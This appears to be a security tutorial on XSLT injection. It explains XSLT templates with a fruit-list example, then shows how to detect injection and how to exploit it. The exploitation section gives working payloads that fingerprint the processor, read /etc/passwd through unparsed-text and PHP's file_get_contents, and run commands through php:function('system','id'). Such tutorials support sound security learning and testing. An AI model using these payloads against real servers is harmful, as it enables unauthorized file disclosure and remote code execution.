# Overview
[eXtensible Stylesheet Language Transformation (XSLT)](https://www.w3.org/TR/xslt-30/) is a language enabling the transformation of XML documents. For instance, it can select specific nodes from an XML document and change the XML structure.
- `<xsl:template>`: This element indicates an XSL template. It can contain a `match` attribute that contains a path in the XML document that the template applies to
- `<xsl:value-of>`: This element extracts the value of the XML node specified in the `select` attribute
- `<xsl:for-each>`: This element enables looping over all XML nodes specified in the `select` attribute

Since XSLT operates on XML-based data, we will consider the following sample XML document to explore how XSLT operates:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```

For instance, a simple XSLT document used to output all fruits contained within the XML document as well as their color, may look like this:

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all the fruits:
		<xsl:for-each select="fruit">
			<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
``` 
And the output should be ;
```text
Here are all the fruits:
    Apple (Red)
    Banana (Yellow)
    Strawberry (Red)
```
# Exploitation
## Identifying XSLT Injection
Let's say that there is a web server that has a page that utilize XSLT processing and the server inserts a value you provide into that page before XSLT processing, in that case we can insert an XSLT payload and the server should processes it and execute it. Once again we can try to provoke an error by sending the server a single `<` which is an invalid xml tag. In case we get a `500` response we can move further
## Information Disclosure
We can try to infer some basic information about the XSLT processor in use by injecting the following XSLT elements;

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

## Local File Inclusion (LFI)
We can try to use multiple different functions to read a local file. Whether a payload will work depends on the XSLT version and the configuration of the XSLT library. For instance, XSLT contains a function `unparsed-text` that can be used to read a local file;

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

However, it was only introduced in XSLT version 2.0. Thus, if our server uses version 1.0 it does not support this function and instead errors out. However, if the XSLT library is configured to support PHP functions, we can call the PHP function `file_get_contents` using the following XSLT element;

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

## Remote Code Execution (RCE)
If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command to obtain RCE. For instance, we can call the PHP function `system` to execute a command;

```xml
<xsl:value-of select="php:function('system','id')" />
```